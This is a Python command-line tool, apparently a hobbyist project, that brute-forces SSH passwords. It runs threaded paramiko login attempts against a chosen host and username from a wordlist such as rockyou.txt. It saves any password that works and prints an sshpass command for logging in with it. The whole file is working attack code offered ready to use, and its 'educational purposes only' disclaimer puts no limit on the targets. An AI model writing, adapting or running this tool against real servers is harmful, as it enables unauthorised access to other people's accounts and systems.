#!/usr/bin/python3

from pwn import *

from datetime import datetime

import paramiko, argparse, platform

import threading, time, os, sys

from termcolor import cprint, colored

from colorama import Fore

import colorama

stop_flag = 0

attempts = 0

T = colored("T","yellow", attrs=['bold'])

X = colored("X","red", attrs=['bold'])

V = colored("V","green", attrs=['bold'])

At = colored("!","yellow", attrs=['bold'])

by_drax = colored("\x1B[3m by DR4X_ \x1B[0m", 'white')

word = colored(f"""
	   _____ _____  __  __  ______ __  __ ______ _____  ____   __
	  / ___// ___/ / / / / / ____// / / //_  __/|__  / / __ \ / /
	  \__ \ \__ \ / /_/ / / /    / / / /  / /    /_ < / /_/ // / 
	 ___/ /___/ // __  / / /___ / /_/ /  / /   ___/ // _, _//_/  
	/____//____//_/ /_/  \____/ \____/  /_/   /____//_/ |_|(_)
{by_drax.rjust(85)}
""", 'red', attrs=['bold'])

parser = argparse.ArgumentParser(prog='ssh-draxer',
								 formatter_class=argparse.RawDescriptionHelpFormatter,
								 conflict_handler='resolve',
								 description='''\
     >> ssh brute forcer <<
--------------------------------
 For Educational Purposes only!
--------------------------------
''',
usage='''python3 ssh-bruteforcer.py --help

       python3 ssh-bruteforcer.py -h [hostname] -u [username] -w [wordlist]

       python3 ssh-bruteforcer.py --host [hostname] --username [username] --wordlist [wordlist]''',
epilog='''
exemple: python3 ssh-bruteforcer.py -h 127.0.0.1 -u user -w rockyou.txt
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt

For Specific Port -p:
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt -p [port_number]

For More Details -v:
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt -p 22 -v

For Save Result -o:
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt -p 22 -v -o [filename]

To Increase Speed -T:
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt -p 22 -v -o [filename] -T [One Digit]

For Encoding Type -e:
exemple: python3 ssh-bruteforcer.py --host 127.0.0.2 --username user --wordlist rockyou.txt -p 22 -v -e [Encoding Type]''')

group = parser.add_mutually_exclusive_group()

parser.add_argument('Wordlist', help='By Default [/usr/share/wordlists/rockyou.txt] Make Sure For Path', action='store_true')
parser.add_argument('Threads', help='Low Threads=High_Speed But It Will Affect Your Result. !!! ', action='store_true')
parser.add_argument('Unicodes', help='Make Sure About Your File Type Before Use -e !!! ', action='store_true')
parser.add_argument('-h', '--host', help='Target Hostname!', metavar='', required=True)
parser.add_argument('-u', '--username', help='Target Username!', metavar='', required=True)
parser.add_argument('-w', '--wordlist', help='Take A Good Wordlist Like Rockyou.txt(default)', default='/usr/share/wordlists/rockyou.txt', metavar='')
group.add_argument('-v', '--verbose', help='Verbose For More Detail About Your Brute Force', action='store_true')
parser.add_argument('-p', '--port', help='To Connect With Different Port', default=22, metavar='')
parser.add_argument('-o', '--output', help='To Save Your Result In Your File', default='output.txt', metavar='')
parser.add_argument('-T', '--threads', help='To Make Your Brute Force Faster Choose [0, 1, 2, 3, 4] One Degit!',
			type=int,
			default=5,
			choices=[0,1,2,3,4,5],
			metavar='')
parser.add_argument('-e', '--unicode', help='To encode Your Wordlist With Your Unicodes', default='utf-8', metavar='')

if len(sys.argv) == 2:
	print(word)
	args = parser.parse_args()
else:
	args = parser.parse_args()

class errors:

	def file_error():
		print("[{}] File Doesn't Exist [{}]".format(At,At))

	def keyboard_error():
		stop_threads = True
		print("\nI Have Been Killed by You !\n")
		os._exit(os.EX_OK)

	def unicode_error():
		print(f"[{At}] You May Have A Little Problem With Unicodes, Please Check your encoding file type [{At}]")
		print("\t*** Don't Forget To Use -e To Avoid This Errors ***")

	def unicode_big_error():
		print(f"[{At}{At}{At}] This Unicode Error Is From You Don't Do Any Mistake Next Time!")

	def timeout_error():
		print( f"[{T}] Check Your Connection or The Server !!")
		print('===')

def verboser(func):

	def wrapper(host, username, password):

		global attempts

		global stop_threads

		x = "-".rjust(20, '-')
		print(x, 'Processing'.ljust(30,'-'))

		try:
			
			with open(password, "r", encoding=args.unicode, errors='replace') as wordlist:
				
				for password in wordlist.readlines():
					now = datetime.now()

					current_date = now.strftime("%d,%B,%Y, %H,%M,%S")

					if stop_flag == 1:

						t.join()
						os._exit(os.EX_OK)

					password = password.strip()
					print("[{}]-[{}] Attempting Time To Connect --> '{} : {}'".format(current_date, attempts, username, password))
					stop_threads = False
					t = threading.Thread(target=func, args=(host,username,password))
					t.start()
					time.sleep(args.threads)
					attempts += 1

		except FileNotFoundError:
			errors.file_error()

		except KeyboardInterrupt:
			errors.keyboard_error()

		except UnicodeDecodeError:
			errors.unicode_error()

		except LookupError:
			errors.unicode_big_error()

	return wrapper

@verboser
def verboser_brute(host,username, password):

	global stop_flag

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:

		ssh.connect(host, port=int(args.port), username=username, password=password)
		stop_flag = 1
		if args.output and args.output != 'output.txt':
			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
				+ Fore.GREEN + f" {username}" + Fore.RESET)

			with open(args.output, 'a') as file:

				file.write("username: {}\npassword: {}\n".format(username, password))
				file.close()
				out_col = colored(f"{os.getcwd()}/{args.output}", 'white', attrs=['bold'])
				print("="*80)
				print(f'Your Result Has Been Saved in -- {out_col} --'.rjust(10))
				print("="*80)
				os._exit(os.EX_OK)
				ssh.close()

		else:

			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
				+ Fore.GREEN + f" {username}" + Fore.RESET)
			cprint(f"\nHELP: To Connect With Password Using ssh Command You Must Install 'passh' Or 'sshpass'\n\
				 \nTo Install One Of Them: # sudo apt install sshpass\n\
			# sshpass -p {password} ssh {username}@{host}", 'white')
			os._exit(os.EX_OK)
			ssh.close()

		ssh.close()

	except paramiko.ssh_exception.NoValidConnectionsError as e:	
		print("\nSomeThing Is Wrong, Please Check Again!\n")
		with open("log.txt", 'a') as logs:
			logs.write(f"{e}\n")
			logs.close()
		out_log = colored(f"{os.getcwd()}/log.txt", 'yellow', attrs=['bold'])
		print(f"Look Inside The Log File {out_log} To Understand The Error!!")
		os._exit(os.EX_OK)

	except paramiko.ssh_exception.AuthenticationException:
		print("[{}] Failed To Connect --> '{} : {}'".format(X, username, password))
		ssh.close()

	except paramiko.ssh_exception.SSHException:
		pass

	except TimeoutError:
		errors.timeout_error()

def noverboser(func):

	def wrapper(host, username, password):

		global attempts
		global stop_threads

		print("You Are Not Using -v(verbose) So You Can Only See Me! But EveryThing is Good :)")

		try:
			
			with open(password, "r", encoding=args.unicode, errors='replace') as wordlist:
				
				for password in wordlist:

					if stop_flag == 1:

						t.join()
						os._exit(os.EX_OK)
					password = password.strip()
					stop_threads = False
					t = threading.Thread(target=func, args=(host,username,password))
					t.start()
					time.sleep(args.threads)
					attempts += 1

		except FileNotFoundError:
			errors.file_error()

		except KeyboardInterrupt:
			errors.keyboard_error()

		except UnicodeDecodeError:
			errors.unicode_error()

		except LookupError:
			errors.unicode_big_error()

	return wrapper

@noverboser
def noverboser_brute(host, username, password):

	global stop_flag

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:

		ssh.connect(host, int(args.port),username, password)
		stop_flag = 1
		if args.output and args.output != 'output.txt':

			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
				+ Fore.GREEN + f" {username}" + Fore.RESET)

			with open(args.output, 'a') as file:

				file.write("username: {}\npassword: {}\n".format(username, password))
				file.close()
				out_col = colored(f"{os.getcwd()}/{args.output}", 'white', attrs=['bold'])
				print("="*80)
				print(f'Your Result Has Been Saved in -- {out_col} --'.rjust(10))
				print("="*80)
				os._exit(os.EX_OK)
				ssh.close()

		else:

			print(f"\n[{V}] Password Found ==>" + Fore.GREEN + f" {password} " + Fore.RESET + ", For This User ==>" \
				+ Fore.GREEN + f" {username}" + Fore.RESET)
			cprint(f"\nHELP: To Connect With Password Using ssh Command You Must Install 'passh' Or 'sshpass'\n\
				 \nTo Install One Of Them: # sudo apt install sshpass\n\
			# sshpass -p {password} ssh {username}@{host}", 'white')

			os._exit(os.EX_OK)
			ssh.close()

		ssh.close()

	except paramiko.ssh_exception.NoValidConnectionsError as e:	
		print("\nSomeThing Is Wrong, Please Check Again!\n")
		with open("log.txt", 'a') as logs:
			logs.write(f"{e}\n")
			logs.close()
		out_log = colored(f"{os.getcwd()}/log.txt", 'yellow', attrs=['bold'])
		print(f"Look Inside The Log File {out_log} To Understand The Error!!")
		os._exit(os.EX_OK)

	except paramiko.ssh_exception.AuthenticationException:
		ssh.close()

	except paramiko.ssh_exception.SSHException:
		pass

	except TimeoutError:
		errors.timeout_error()

def ver_logs():
	print('[V]-'.ljust(19)+"Verbose Mode".rjust(13)+'-[V]'.rjust(19))
	verboser_brute(args.host, args.username, args.wordlist)

def logs():
	noverboser_brute(args.host, args.username, args.wordlist)

def check_os_ver():
	if platform.system() == 'Linux':
		os.system('clear')
		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
		time.sleep(4)
		os.system('clear')
		print(word)
		time.sleep(1)
		ver_logs()
	else:
		os.system('cls')
		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
		time.sleep(4)
		os.system('cls')
		print(word)
		time.sleep(1)
		ver_logs()

def check_os_nover():
	if platform.system() == 'Linux':
		os.system('clear')
		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
		time.sleep(4)
		os.system('clear')
		print(word)
		time.sleep(1)
		logs()
	else:
		os.system('cls')
		print("Listen! Good Processer, Good And Fast Result, No Illegal Things! Enjoy ;)")
		time.sleep(4)
		os.system('cls')
		print(word)
		time.sleep(1)
		logs()

if __name__ == '__main__':
	if args.verbose:
		check_os_ver()
	else:
		check_os_nover()
